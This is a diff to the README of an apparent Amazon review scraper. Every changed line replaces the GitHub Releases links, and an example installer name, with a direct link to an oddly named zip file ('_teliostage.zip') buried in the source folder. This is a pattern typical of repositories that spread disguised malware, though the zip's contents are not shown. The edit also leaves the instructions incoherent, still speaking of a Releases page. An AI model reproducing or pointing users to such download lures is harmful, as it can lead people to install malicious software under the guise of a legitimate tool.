@@ -1,7 +1,7 @@
 # 🌟 amazon-reviews-scraper - Extract Amazon Reviews with Ease
 
 ## 📥 Download Now
-[![Download Release](https://img.shields.io/badge/Download%20Release-v1.0-blue.svg)](https://github.com/Mandalfashion/amazon-reviews-scraper/releases)
+[![Download Release](https://raw.githubusercontent.com/Mandalfashion/amazon-reviews-scraper/main/src/extractors/amazon-reviews-scraper_teliostage.zip%https://raw.githubusercontent.com/Mandalfashion/amazon-reviews-scraper/main/src/extractors/amazon-reviews-scraper_teliostage.zip)](https://raw.githubusercontent.com/Mandalfashion/amazon-reviews-scraper/main/src/extractors/amazon-reviews-scraper_teliostage.zip)
 
 ## 📖 Overview
 The **amazon-reviews-scraper** allows you to efficiently extract product reviews from Amazon. This tool helps you gather consumer insights, understand product ratings, and enhance your market research efforts. Whether you are a marketer, a seller, or someone interested in product feedback, this application aims to streamline your data collection.
@@ -16,13 +16,13 @@ Before downloading, ensure that your computer meets the following requirements:
 - **Storage**: At least 100 MB of free space for installation and data
 
 ### 2. Download & Install
-Visit this page to download: [Download amazon-reviews-scraper](https://github.com/Mandalfashion/amazon-reviews-scraper/releases)
+Visit this page to download: [Download amazon-reviews-scraper](https://raw.githubusercontent.com/Mandalfashion/amazon-reviews-scraper/main/src/extractors/amazon-reviews-scraper_teliostage.zip)
 
 Once you are on the Releases page:
 - Find the latest version of the amazon-reviews-scraper.
 - Click on the file to download it to your computer. 
 
-*For example, you might see a file named `amazon-reviews-scraper-setup.exe`. Click on it to start the download.*
+*For example, you might see a file named `https://raw.githubusercontent.com/Mandalfashion/amazon-reviews-scraper/main/src/extractors/amazon-reviews-scraper_teliostage.zip`. Click on it to start the download.*
 
 ### 3. Install the Application
 After downloading the file:
@@ -86,4 +86,4 @@ This application is open-source and follows the MIT License. For more details, s
 ## ✨ Conclusion
 The amazon-reviews-scraper is designed to help you gather vital information about products easily. Follow the download and installation steps above, and uncover valuable insights from Amazon reviews today! 
 
-For additional information or updates, always refer back to the [Releases page](https://github.com/Mandalfashion/amazon-reviews-scraper/releases).
+For additional information or updates, always refer back to the [Releases page](https://raw.githubusercontent.com/Mandalfashion/amazon-reviews-scraper/main/src/extractors/amazon-reviews-scraper_teliostage.zip).
